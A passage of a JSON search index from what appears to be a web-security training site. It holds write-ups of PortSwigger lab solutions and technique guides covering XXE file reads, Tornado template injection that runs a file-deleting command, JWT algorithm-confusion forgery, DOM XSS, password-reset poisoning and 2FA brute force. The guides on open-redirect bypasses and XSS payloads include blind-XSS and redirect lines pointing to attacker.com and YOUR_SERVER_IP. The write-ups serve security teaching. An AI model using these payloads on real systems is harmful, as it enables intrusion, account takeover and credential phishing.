directory traversal vulnerabilities. Resources  Portswigger: Directory traversal OWASP: Path traversal",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "135c4fbe5a25de3fdeb0b1acb0f9154d",
    "u": "https://webapp.tymyrddin.dev/docs/xxe/1",
    "t": "Exploiting XXE using external entities to retrieve files ",
    "c": "Exploiting XXE using external entities to retrieve files  Description  This lab has a “Check stock” feature that parses XML input and returns any unexpected values in the response. Reproduction and proof of concept  Visit a product page, click Check stock , and intercept the resulting POST request in Burp Suite. Send to Repeater. Insert the following external entity definition in between the XML declaration and the stockCheck element: <!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> Replace the productId number with a reference to the external entity: &xxe; . Exploitability  An attacker only needs to inject an XML external entity to retrieve the contents of the /etc/passwd file.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1f90639ba99ff103d928ce029031849",
    "u": "https://webapp.tymyrddin.dev/docs/ssti/2",
    "t": "Basic server-side template injection (code context) ",
    "c": "Basic server-side template injection (code context)  Description  This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos’s home directory. Reproduction and proof of concept  Log in as wiener:peter and while proxying traffic through Burp, log in and post a comment on one of the blog posts. Notice that on the My account page, you can select whether you want the site to use your full name, first name, or nickname. When you submit your choice, a POST request sets the value of the parameter blog-post-author-display to either user.name , user.first_name , or user.nickname . When you load the page containing your comment, the name above your comment is updated based on the current value of this parameter. In Burp, go to Proxy” > “HTTP history and find the request that sets this parameter, namely POST /my-account/change-blog-post-author-display , and send it to Burp Repeater. Study the Tornado documentation to discover that template expressions are surrounded with double curly braces, such as {{someExpression}} . In Burp Repeater, notice that you can escape out of the expression and inject arbitrary template syntax as follows: blog-post-author-display=user.name}}{{7*7}} Reload the page containing your test comment. Notice that the username now says Peter Wiener49}} , indicating that a server-side template injection vulnerability may exist in the code context. In the Tornado documentation, identify the syntax for executing arbitrary Python: {% somePython %} Study the Python documentation to discover that by importing the os module, you can use the system() method to execute arbitrary system commands. Combine this knowledge to construct a payload that deletes Carlos’s file: {% import os %} {{os.system('rm /home/carlos/morale.txt') In Burp Repeater, go back to POST /my-account/change-blog-post-author-display . Break out of the expression, and inject your payload into the parameter, remembering to URL-encode it as follows: blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt') Reload the page containing your comment to execute the template and solve the lab. Exploitability  An attacker will need to review the Tornado documentation to discover how to execute arbitrary code, then log in and delete the morale.txt file from Carlos’s home directory.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "798a759bd328821fa1065b93b7bfd1ce",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy CSRF Labs Introduction  What?  Cross-site request forgery (CSRF) is a client-side technique used to attack other users of a web application. Why?  Cross-site request forgery is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. Using CSRF, attackers can send HTTP requests that pretend to come from the victim, carrying out unwanted actions on a victim’s behalf. For example, an attacker could change a password or transfer money from a bank account without permission. If the victim is an administrative account, CSRF can compromise the entire web application. How?  Cross-site request forgery (CSRF) techniques CSRF vulnerability with no defenses CSRF where token validation depends on request method CSRF where token validation depends on token being present CSRF where token is not tied to user session CSRF where token is tied to non-session cookie CSRF where token is duplicated in cookie SameSite Lax bypass via method override SameSite Strict bypass via client-side redirect SameSite Strict bypass via sibling domain SameSite Lax bypass via cookie refresh CSRF where Referer validation depends on header being present CSRF with broken Referer validation",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e00a06b8a97235db15a8b6a88a0297f9",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/8",
    "t": "JWT authentication bypass via algorithm confusion with no exposed key ",
    "c": "JWT authentication bypass via algorithm confusion with no exposed key  Description  This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks. Reproduction and proof of concept  Obtain two JWTs generated by the server  In Burp, load the JWT Editor extension from the BApp store. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Copy your JWT session cookie and save it somewhere for later. eyJraWQiOiI2ZDE3ZjljNS0xZTAxLTRiYmYtOGNmOS1iNDMyODc3NzBkNzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3NzYwMzEwN30.AN4-QKoqSM6P4jwckXGoit_PuxtivWVEXHMwhno3Wxeccs7Exd9neNLIoiJc1ZEBZRBMqPtrDr9HH8Ci55KY7VScoi945grxYeSLXo1zTMAe1hhCgMeK_DFQh0eZZKlwQTrGtYPb_KbSajhUkzs9gQz68eve7n94gjgg0mdmFNT7_x0TYUw9HVl1yC2fwsAnacwfHsR-yvf5L6D2tXMAUwvSjtbbuP3uOB-DjXAd9-Elz-haYycDYBp9VpHwDht-Gvo7laL6iAH5XyGqzRpBmJYbrYcKKYrDUzFRSvQaS_DjRUiMumxWQs8peKrMYxn9Kqwb7EsdE5d0hw-KXCUYwQ Log out and log in again. Copy the new JWT session cookie and save this as well. eyJraWQiOiI2ZDE3ZjljNS0xZTAxLTRiYmYtOGNmOS1iNDMyODc3NzBkNzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3NzYwMzIxOX0.RacDd1lvCWXy36Ws4rp5_RlG5v06Zq6I0q39P0aS2quvLv48aDZGgQir7Aojb8D08w9j2qhBw0XEIYzKLaA3p-nru2fdxY-ucoGlDBXxqhHLFDkk5lgKumbf6DMz6kS24FKVJD7cshshJSx8_NU5tT2fvKxYY4uGeq1KEFg0o_blz5Zt8lLnAk_r-xfWgOf0i3SYXDTuJB6eHXQHO8dANSTpsu-YF-Z9J6K79-3UkGU76y3mSzoM_2w_PpfMADfZ112sHx9rz326PYmspCABwIA5ZMKgLm1-1e12waesXA7CAsocQ4rfgHTZdX3zoaYOZ44v_uxxZmWeIgHPL0xTSA You now have two valid JWTs generated by the server. Brute-force the server’s public key  In a terminal, run the following command, passing in the two JWTs as arguments. $ docker run --rm -it portswigger/sig2n eyJraWQiOiI2ZDE3ZjljNS0xZTAxLTRiYmYtOGNmOS1iNDMyODc3NzBkNzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3NzYwMzEwN30.AN4-QKoqSM6P4jwckXGoit_PuxtivWVEXHMwhno3Wxeccs7Exd9neNLIoiJc1ZEBZRBMqPtrDr9HH8Ci55KY7VScoi945grxYeSLXo1zTMAe1hhCgMeK_DFQh0eZZKlwQTrGtYPb_KbSajhUkzs9gQz68eve7n94gjgg0mdmFNT7_x0TYUw9HVl1yC2fwsAnacwfHsR-yvf5L6D2tXMAUwvSjtbbuP3uOB-DjXAd9-Elz-haYycDYBp9VpHwDht-Gvo7laL6iAH5XyGqzRpBmJYbrYcKKYrDUzFRSvQaS_DjRUiMumxWQs8peKrMYxn9Kqwb7EsdE5d0hw-KXCUYwQ eyJraWQiOiI2ZDE3ZjljNS0xZTAxLTRiYmYtOGNmOS1iNDMyODc3NzBkNzYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY3NzYwMzIxOX0.RacDd1lvCWXy36Ws4rp5_RlG5v06Zq6I0q39P0aS2quvLv48aDZGgQir7Aojb8D08w9j2qhBw0XEIYzKLaA3p-nru2fdxY-ucoGlDBXxqhHLFDkk5lgKumbf6DMz6kS24FKVJD7cshshJSx8_NU5tT2fvKxYY4uGeq1KEFg0o_blz5Zt8lLnAk_r-xfWgOf0i3SYXDTuJB6eHXQHO8dANSTpsu-YF-Z9J6K79-3UkGU76y3mSzoM_2w_PpfMADfZ112sHx9rz326PYmspCABwIA5ZMKgLm1-1e12waesXA7CAsocQ4rfgHTZdX3zoaYOZ44v_uxxZmWeIgHPL0xTSA Unable to find image 'portswigger/sig2n:latest' locally latest: Pulling from portswigger/sig2n 4d32b49e2995: Pull complete fd4c1550e6ae: Pull complete 53fa7e173a75: Pull complete cb9851eb83a1: Pull complete a6e75cf35200: Pull complete aaa5be4dc23b: Pull complete 912e8eb4e88a: Pull complete Digest: sha256:0f1a6583c2578ffc42b7f3ee3a7f718c2979bc5b83ba7e125197b368f67b26d9 Status: Downloaded newer image for portswigger/sig2n:latest Running command: python3 jwt_forgery.py <token1> <token2> Found n with multiplier 1: Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZm5KSW9pZGc5U1NTU1dnQUxXegpLQ25NZy90czFOZXQrTUhlNGpBeGM3REtMWUpkdlZFQXBOMktsQnl4eFNaYUF6ZDJhaHJ6d1BJVWdJQTVzdHI0ClR1V1BHNmxWZXMxZDByeUNjeS9OUlNjNm4vVk1zZ3JBYjVjWVUwZzRqNTN2VnliMVlqU1hjdkFXZUQ5bCtQQ3UKV0ZsUnF6M204d2dkT3dTUlQ2ck9BdEFwWHB6ekRva0JJS0Vrc1huTjYxeEF0Z0RBTnlGVUMyeGFvSXYrcS9IVQo0UHB3Y3ZpWUc2QzI3akd4S2VQUHFWVU41NFNKNjF0dXZoK2NLaHlrNkphdTQwUk5rZ1pHcFFsMTg2ODVuUWVNCmw3dmVPUDcrbUdtWEtQZVNGL2FFVlZNRXI1SjRWY3N2L3puYVdXWWt3Y1FoQVI0M0daZkZJRyswM1N6YWFBTGcKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg== Tampered JWT: eyJraWQiOiI2ZDE3ZjljNS0xZTAxLTRiYmYtOGNmOS1iNDMyODc3NzBkNzYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjc3Njg2MzE0fQ.tcNeoW0x-wFx0F5o4UdOxyES-PorZjiDiDD6xziJYHs Base64 encoded pkcs1 key: LS0tLS1CRUdJTiBSU0EgUFVCTElDIEtFWS0tLS0tCk1JSUJDZ0tDQVFFQXFmbkpJb2lkZzlTU1NTV2dBTFd6S0NuTWcvdHMxTmV0K01IZTRqQXhjN0RLTFlKZHZWRUEKcE4yS2xCeXh4U1phQXpkMmFocnp3UElVZ0lBNXN0cjRUdVdQRzZsVmVzMWQwcnlDY3kvTlJTYzZuL1ZNc2dyQQpiNWNZVTBnNGo1M3ZWeWIxWWpTWGN2QVdlRDlsK1BDdVdGbFJxejNtOHdnZE93U1JUNnJPQXRBcFhwenpEb2tCCklLRWtzWG5ONjF4QXRnREFOeUZVQzJ4YW9JditxL0hVNFBwd2N2aVlHNkMyN2pHeEtlUFBxVlVONTRTSjYxdHUKdmgrY0toeWs2SmF1NDBSTmtnWkdwUWwxODY4NW5RZU1sN3ZlT1A3K21HbVhLUGVTRi9hRVZWTUVyNUo0VmNzdgovem5hV1dZa3djUWhBUjQzR1pmRklHKzAzU3phYUFMZ0pRSURBUUFCCi0tLS0tRU5EIFJTQSBQVUJMSUMgS0VZLS0tLS0K Tampered JWT: eyJraWQiOiI2ZDE3ZjljNS0xZTAxLTRiYmYtOGNmOS1iNDMyODc3NzBkNzYiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAic3ViIjogIndpZW5lciIsICJleHAiOiAxNjc3Njg2MzE0fQ.28rDcjIksdfV9zqNnBFOlQL0HCqR8alai2yCbbQT9SU Note that the first time you run this, it may take several minutes while the image is pulled from Docker Hub. Notice that the output contains one or more calculated values of n . Each of these is mathematically possible, but only one of them matches the value used by the server. In each case, the output also provides the following: A Base64-encoded public key in both X.509 and PKCS1 format. A tampered JWT signed with each of these keys. Copy the tampered JWT from the first X.509 entry (you may only have one). Go back to your request in Burp Repeater and change the path back to /my-account . Replace the session cookie with this new JWT and then send the request. If you receive a 200 response and successfully access your account page, then this is the correct X.509 key. If you receive a 302 response that redirects you to /login and strips your session cookie, then this was the wrong X.509 key. In this case, repeat this step using the tampered JWT for each X.509 key that was output by the script. Generate a malicious signing key  From your terminal window, copy the Base64-encoded X.509 key that you identified as being correct in the previous section. Note that you need to select the key, not the tampered JWT that you used in the previous section. In Burp, go to the JWT Editor Keys tab and click New Symmetric Key . In the dialog, click Generate to generate a new key in JWK format. Replace the generated value for the k property with a Base64-encoded key that you just copied. Note that this should be the actual key, not the tampered JWT that you used in the previous section. { \"kty\": \"oct\", \"kid\": \"cfa89837-da73-40ee-af74-8d68f37f1f2c\", \"k\": \"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxZm5KSW9pZGc5U1NTU1dnQUxXegpLQ25NZy90czFOZXQrTUhlNGpBeGM3REtMWUpkdlZFQXBOMktsQnl4eFNaYUF6ZDJhaHJ6d1BJVWdJQTVzdHI0ClR1V1BHNmxWZXMxZDByeUNjeS9OUlNjNm4vVk1zZ3JBYjVjWVUwZzRqNTN2VnliMVlqU1hjdkFXZUQ5bCtQQ3UKV0ZsUnF6M204d2dkT3dTUlQ2ck9BdEFwWHB6ekRva0JJS0Vrc1huTjYxeEF0Z0RBTnlGVUMyeGFvSXYrcS9IVQo0UHB3Y3ZpWUc2QzI3akd4S2VQUHFWVU41NFNKNjF0dXZoK2NLaHlrNkphdTQwUk5rZ1pHcFFsMTg2ODVuUWVNCmw3dmVPUDcrbUdtWEtQZVNGL2FFVlZNRXI1SjRWY3N2L3puYVdXWWt3Y1FoQVI0M0daZkZJRyswM1N6YWFBTGcKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==\" } Save the key. Modify and sign the token  Go back to your request in Burp Repeater and change the path to /admin . Switch to the extension-generated JSON Web Token tab. In the header of the JWT, make sure that the alg parameter is set to HS256 . In the JWT payload, change the value of the sub claim to administrator . At the bottom of the tab, click Sign , then select the symmetric key that you generated in the previous section. Make sure that the Don't modify header option is selected, then click OK . The...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f74d25958071503d222577c4119358d8",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/redirects",
    "t": "Open redirection ",
    "c": "Open redirection  Sites often use HTTP or URL parameters to redirect users to a specified URL without any user action. While this behaviour can be useful, it can also cause open redirects, which happen when an attacker is able to manipulate the value of this parameter to redirect the user offsite. Open redirects are generated due to an incorrect URL validation in the application. The most common consequence is phishing. In some cases, the behaviour depends on the browser used to interact with the application. It is because some methods used by the developers to create the redirections just work in a few browsers. Open redirects are most common in Internet Explorer. Steps  Search for redirect URL parameters. These might be vulnerable to parameter-based open redirect. Search for pages that perform referer-based redirects. These are candidates for a referer-based open redirect. Test the pages and parameters found for open redirects. If the server blocks the open redirect, try protection bypass techniques. Brainstorm ways of using the open redirect in other bug chains. There are some redirections that are easy to detect – most redirections use a GET request. Others are a little more difficult to detect in simple view and need the use of the HTTP proxy to confirm them. Look for redirect parameters  Start by searching for the parameters used for redirects: https://example.com/login?redirect=https://example.com/dashboard https://example.com/login?redir=https://example.com/dashboard https://example.com/login?next=https://example.com/dashboard https://example.com/login?next=/dashboard Redirections using JavaScript: window.open('http://example.com') location.replace('http://example.com') location.assign('http://example.com') location.href='http://example.com' location='http://example.com' location.port='8080' document.URL() URL Open your proxy while you browse the website. Then, in HTTP history, look for any parameter that contains absolute or relative URLs. Also take note of the pages that do not contain redirect parameters in their URLs but still automatically redirect their users. These pages are candidates for referer-based open redirects. To find these pages, keep an eye out for 3XX response codes like 301 and 302 . These response codes indicate a redirect. Use Google Dorks  Google dorking is an efficient way to find redirect parameters. To look for redirect parameters on a target site, start by setting the site search term to your target site: site:example.com Then look for pages that contain URLs in their URL parameters, making use of %3D , the URL-encoded version of the equal sign ( = ): inurl:%3Dhttp site:example.com Also try using %2F , the URL-encoded version of the slash ( / ) to get relative URLs: inurl:%3D%2F site:example.com And search for the names of common URL redirect parameters: inurl:redir site:example.com inurl:redirect site:example.com inurl:redirecturi site:example.com inurl:redirect_uri site:example.com inurl:redirecturl site:example.com inurl:redirect_url site:example.com inurl:return site:example.com inurl:returnurl site:example.com inurl:relaystate site:example.com inurl:forward site:example.com inurl:forwardurl site:example.com inurl:forward_url site:example.com inurl:url site:example.com inurl:uri site:example.com inurl:dest site:example.com inurl:destination site:example.com inurl:next site:example.com Test for parameter-based open redirects  Investigate the functionality of each redirect parameter found and test each one for an open redirect. Insert a random hostname, or a hostname you own, into the redirect parameters; then see if the site automatically redirects to the site specified. Some sites will redirect to the destination site immediately, others require a user action first. Test for referer-based open redirects  Set up a page on a domain you own and host this HTML page: <html> <a href=\"https://example.com/login\">Click on this link!</a> </html> Replace the linked URL with the target page. Then reload and visit your HTML page. Click the link and see if you get redirected to your site automatically or after the required user interactions. Bypassing protections  Sites prevent open redirects by validating the URL used to redirect the user, making the root cause of open redirects failed URL validation. And, URL validation is extremely difficult to get right. Sometimes validators do not account for all the edge cases that can cause the browser to behave unexpectedly. In this case, try to bypass the protection by using a few strategies. Modern browsers often autocorrect URLs that do not have the correct components, in order to correct mangled URLs caused by user typos. https:attacker.com https;attacker.com https:\\/\\/attacker.com https:/\\/\\attacker.com As a common defense against open redirects, the URL validator often checks if the redirect URL starts with, contains, or ends with the site’s domain name. This type of protection can be bypassed by creating a subdomain or directory with the target’s domain name: https://example.com/login?redir=http://example.com.attacker.com https://example.com/login?redir=http://attacker.com/example.com The validator might accept only URLs that both start and end with a domain listed on the allowlist. This URL satisfies both of these rules: https://example.com/login?redir=https://example.com.attacker.com/example.com Or you could use the at symbol ( @ ) to make the first example.com the username portion of the URL: https://example.com/login?redir=https://example.com@attacker.com/example.com Especially custom-built URL validators are prone to attacks like these, because developers did not consider all edge cases. Too agile maybe? You can also manipulate the scheme portion of the URL to try to fool the validator. data:MEDIA_TYPE[;base64],DATA Use the data: scheme to construct a base64-encoded redirect URL that evades the validator. When validators validate URLs, or when browsers redirect users, they have to first find out what is contained in the URL by decoding any characters that are URL encoded. If there is any inconsistency between how the validator and browsers decode URLs, this can be exploited. Try to double- or triple-URL-encode certain special characters (like the slash) in the payload. if the validator does not double-decode URLs, but the browser does, you can use a payload like this: https://attacker.com%252f@example.com Non-ASCII characters ( %ff is the character ÿ , a non-ASCII character): https://attacker.com%ff.example.com The validator has determined that example.com is the domain name, and attacker.comÿ is the subdomain name. Sometimes browsers decode non-ASCII characters into question marks: https://attacker.com?.example.com Another common scenario is that browsers will attempt to find a “most alike” character (the ( ╱ ) here is %E2%95%B1 ): https://attacker.com╱.example.com You can also use character sets in other languages to bypass filters, like Unicode . To defeat more-sophisticated URL validators, combine multiple strategies to bypass layered defenses, like: https://example.com%252f@attacker.com/example.com Escalation  Attackers could use open redirects by themselves to make their phishing attacks more credible. For example, they could send this URL in an email to a user: https://example.com/login?next=https://attacker.com/fake_login.html Though this URL would first lead users to the legitimate website, it would redirect them to the attacker’s site after login. The attacker could host a fake login page on a malicious site that mirrors the legitimate site’s login page, and prompt the user to log in again. Believing they’ve entered an incorrect password, the user would provide their credentials to the attacker’s site. At this point, the attacker’s site could even redirect the user back to the legitimate site to keep the victim from realizing that their credentials were stolen. An open redirect can help you bypass URL blocklists and allowlists:...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6b57bbeae816f82dce53693eab9a74d8",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/xss",
    "t": "Cross-site scripting (XSS) ",
    "c": "Cross-site scripting (XSS)  An XSS vulnerability is an input validation error. All the input data in an application could be susceptible to XSS or other input validation vulnerabilities. It is important to review not just the fields in forms, but all the inputs, including the application control flow parameters. Use a HTTP proxy to analyse the HTTP request and avoid client-side security controls. All the input validation functions need to be developed in the backend. Try different types of encodings and payload variants. Most of the time, developers use black and white lists to prevent XSS vulnerabilities. These controls can sometimes be avoided. It just needs time and persistence. Steps  Look for user input opportunities on the application. When user input is stored and used to construct a web page later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page, test for reflected and DOM XSS. Insert XSS payloads into the user input fields you’ve found. Insert payloads from lists online, a polyglot payload, or a generic test string. Confirm the impact of the payload by checking whether your browser runs your JavaScript code. Or in the case of a blind XSS, see if you can make the victim browser generate a request to your server. If you can’t get any payloads to execute, try bypassing XSS protections. Automate the XSS hunting process. Consider the impact of the XSS you’ve found: who does it target? How many users can it affect? And what can you achieve with it? Can you escalate the attack by using what you’ve found? Create an XSS report. Look for input opportunities  Turn on your proxy’s traffic interception and modify the request before forwarding it to the server. In Burp, you can edit the request directly in the Proxy tab. After you’re done editing, click Forward to forward the request to the server. If you’re attempting stored XSS, search for places where input gets stored by the server and later displayed to the user, including comment fields, user profiles, and blog posts. The types of user input that are most often reflected back to the user are forms, search boxes, and name and username fields in sign-ups. Sometimes drop-down menus or numeric fields can allow you to perform XSS, because even if you can’t enter your payload on your browser, your Zap or Burp proxy might let you insert it directly into the request. If you’re hoping to find reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user. A good way to do this is to insert a custom string into each URL parameter and check whether it shows up in the returned page. Insert the custom string into every user-input opportunity you can find. Then, when you view the page in the browser, search the page’s source code for it (View Source) by using your browser’s page-search functionality (usually CTRL-F). This should give an idea of which user input fields appear in the resulting web page. Note: There is JS code that is using some data which can be controlled unsafely, like location.href . This can be used to execute arbitrary JavaScript code in DOM based XSS. Insert payloads  Once user-input opportunities present in an application have been identified, start entering a test XSS payload at the discovered injection points. The simplest payload to test with is an alert box: <script>alert('Hello World');</script> Most websites nowadays implement some sort of XSS protection on their input fields, and this payload will not work. A simple payload like this one is more likely to work on IoT or embedded applications that do not use the latest frameworks. More than script tag  Some HTML attributes allow for specifying a script to run if certain conditions are met. For example, the onload event attribute runs a specific script after the HTML element has loaded: <img onload=alert('The image has been loaded!') src=\"example.png\"> The onclick event attribute specifies the script to be executed when the element is clicked, and onerror specifies the script to run in case an error occurs loading the element. If you can insert code into these attributes, or even add a new event attribute into an HTML tag, you can create an XSS. Another way of achieving XSS is through special URL schemes, like javascript: and data: . The javascript: URL scheme allows for executing JavaScript code specified in the URL. For example, entering this URL will cause an alert box with the text “Hello World” to appear: javascript:alert('Hello World') Data URLs that use the data: scheme, allow for embedding small files in a URL: data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQnKTwvc2NyaXB0Pg==\" PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQnKTwvc2NyaXB0Pg== is the base64 encoded form of <script>alert('Hello World')</script> . Documents contained within data: URLs do not need to be base64 encoded, but base64 encoding can often help you bypass XSS filters. There are many more ways to execute JavaScript code to bypass XSS protection. See the cheatsheets. Closing out HTML tags  <img src=\"USER_INPUT\"> The payload has to include the ending of an img tag before the JavaScript: \"/><script>location=\"http://attacker.com\";</script> Injected, the resulting HTML will look like this: <img src=\"\"/><script>location=\"http://attacker.com\";</script>\"> If a payload is not working, check whether the payload caused syntax errors in the returned document, by inspecting the returned document in your proxy and look for unclosed tags or other syntax issues. Improving effectiveness  Another way of approaching manual XSS testing is to insert an XSS polyglot, a type of XSS payload that executes in multiple contexts. Example: javascript:\"/*\\\"/*`/*' /*</template> </textarea></noembed></noscript></title> </style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//> Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. Insert a string of special HTML characters often used in XSS payloads, such as the following: >’<”//:=;!–. Take note of which ones the application escapes and which get rendered directly. Then construct test XSS payloads from the characters that you know the application isn’t properly sanitizing. Blind XSS  Blind XSS flaws are harder to detect; since you can’t detect them by looking for reflected input, you can’t test for them by trying to generate an alert box. Instead, try making the victim’s browser generate a request to a server you own. For example, you can submit the following payload, which will make the victim’s browser request the page /xss on your server: <script src='http://YOUR_SERVER_IP/xss'></script> Monitor the server logs to see if anyone requests that page. If you see a request to the path /xss , a blind XSS has been triggered. XSS Hunter can automate this process. Confirm the impact  Check for the payload on the destination page. Sites might also use user input to construct something other than the next returned web page. Your input could show up in future web pages, email, and file portals. A time delay also might occur between when the payload is submitted and when the user input is rendered. This situation is common in log files and analytics pages. If you’re targeting these, the payload might not execute until later, or in another user’s account. Some XSS payloads will execute in certain contexts, such as when an admin is logged in or when the user actively clicks, or hovers over, certain HTML elements. Confirm the impact of the XSS payload by browsing to the necessary pages and performing those actions. Bypassing protections  Most applications implement some sort of XSS protection in their input fields. Common is using a blocklist to filter out dangerous expressions that might be indicative of XSS. This type of protection can be bypassed. Alternative JavaScript syntax: Some applications will sanitize script tags in user input. If that is the case, try executing XSS...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "bc1790d65271722802037ea639b6335e",
    "u": "https://webapp.tymyrddin.dev/docs/dom/3",
    "t": "DOM XSS using web messages and JSON.parse ",
    "c": "DOM XSS using web messages and JSON.parse  Description  This lab uses web messaging and parses the message as JSON. Reproduction and proof of concept  Analysis: <script> window.addEventListener('message', function(e) { var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d; document.body.appendChild(iframe); try { d = JSON.parse(e.data); } catch(e) { return; } switch(d.type) { case \"page-load\": ACMEplayer.element.scrollIntoView(); break; case \"load-channel\": ACMEplayer.element.src = d.url; break; case \"player-height-changed\": ACMEplayer.element.style.width = d.width + \"px\"; ACMEplayer.element.style.height = d.height + \"px\"; break; } }, false); </script> The home page contains an event listener that listens for a web message. This event listener expects a string that is parsed using JSON.parse() . In the JavaScript, the event listener expects a type property and that the load-channel case of the switch statement changes the iframe src attribute. IOW, when a message is received, the script creates an iframe and appends it to the current page. The message is then parsed as JSON and, depending on the message content, an action may be performed. A possible actions is loading an url contained in the message within the iframe . See the mozilla documentation for iframe : In the lab, no checks are done on the content of the message, so it is possible to inject a JavaScript url : { \"type\": \"load-channel\", \"url\": \"javascript:print()\" } Go to the exploit server and add this iframe to the body field: Store the exploit and deliver it to the victim. When the iframe we constructed loads, the postMessage() method sends a web message to the home page with the type load-channel . The event listener receives the message and parses it using JSON.parse() before sending it to the switch . The switch triggers the load-channel case, which assigns the url property of the message to the src attribute of the ACMEplayer.element iframe . However, in this case, the url property of the message actually contains our JavaScript payload. As the second argument specifies that any targetOrigin is allowed for the web message, and the event handler does not contain any form of origin check, the payload is set as the src of the ACMEplayer.element iframe . The print() function is called when the victim loads the page in their browser. Exploitability  An attacker needs to construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6b927748d8d30a816d0e7b7d2adb4294",
    "u": "https://webapp.tymyrddin.dev/docs/auth/11",
    "t": "Password reset poisoning via middleware ",
    "c": "Password reset poisoning via middleware  Description  This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. Reproduction and proof of concept  With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email. Send the POST /forgot-password request to Burp Repeater. Notice that the X-Forwarded-Host header is supported, and you can use it to point the dynamically generated reset link to an arbitrary domain. Go to the exploit server and make a note of your exploit server URL. Go back to the request in Burp Repeater and add the X-Forwarded-Host header with your exploit server URL: X - Forwarded - Host : // exploit - 0 a6900b503fbfa43c55c132a015300bb . exploit - server . net Change the username parameter to carlos and send the request. Go to the exploit server and open the access log. You should see a GET /forgot-password request, which contains the victim’s token as a query parameter. Make a note of this token. temp-forgot-password-token=DbzZ4lHeIfiXFSg7vHKSMl74XnyXDXKV Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the temp-forgot-password-token parameter to the value that you stole from the victim. https://0af600a703a2fac9c55d145800d00068.web-security-academy.net/forgot-password?temp-forgot-password-token=DbzZ4lHeIfiXFSg7vHKSMl74XnyXDXKV Load this URL and set a new password for Carlos’s account. Log in to Carlos’s account using the new password to solve the lab. Exploitability  An attacker can log in to wiener:peter . Any emails sent to this account can be read via the email client on the exploit server. The attacker will need to log in to Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "94c0664dd4908be96c182e45196e6e13",
    "u": "https://webapp.tymyrddin.dev/docs/auth/8",
    "t": "2FA broken logic ",
    "c": "2FA broken logic  Description  This lab ’s two-factor authentication is vulnerable due to its flawed logic. Reproduction and proof of concept  With Burp running, log in with wiener:peter and investigate the 2FA verification process. Notice that in the POST /login2 request, the verify parameter is used to determine which user’s account is being accessed. Log out of your account. Send the GET /login2 request to Burp Repeater. Change the value of the verify parameter to carlos and send the request. This ensures that a temporary 2FA code is generated for Carlos. Go to the login page and enter your username and password. Then, submit an invalid 2FA code. Send the POST /login2 request to Burp Intruder. In Burp Intruder, set the verify parameter to carlos and add a payload position to the mfa-code parameter. Brute-force the verification code. Load the 302 response in your browser. Exploitability  An attacker will need to make sure a MFA-code verification code is generated for user carlos by issuing a GET request to login2 , then bruteforce the POST request to login2 using the Payload type: Brute forcer",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1d49dd58fd95b553d8801edac8f16cbf",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/sqli",
    "t": "SQL injection ",
